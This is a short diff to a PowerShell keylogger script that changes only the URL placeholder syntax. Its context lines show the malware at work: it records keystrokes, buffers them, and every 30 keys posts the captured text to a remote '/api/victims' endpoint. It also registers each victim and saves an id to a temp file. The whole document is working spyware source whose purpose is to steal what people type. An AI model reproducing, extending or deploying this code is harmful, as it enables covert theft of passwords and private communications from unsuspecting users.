@@ -28,7 +28,7 @@ function Setup-Logging($Path="$env:temp\keys.txt"){
   }
 
   # write result into a file for later use
-  $result = Post-Data -Data $Data -Url {{ baseURI }}/api/victims
+  $result = Post-Data -Data $Data -Url __baseURI__/api/victims
 
   $result.id | Out-File $Path
   return $object.id
@@ -89,7 +89,7 @@ public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeyst
 
           if($count -eq 30){
             $data = @{keystrokes = $log}
-            $null = Post-Data -Url {{ baseURI }}/api/victims/$id/logs -Data $data
+            $null = Post-Data -Url __baseURI__/api/victims/$id/logs -Data $data
 
             # reset counter and logged characters
             $count = 0
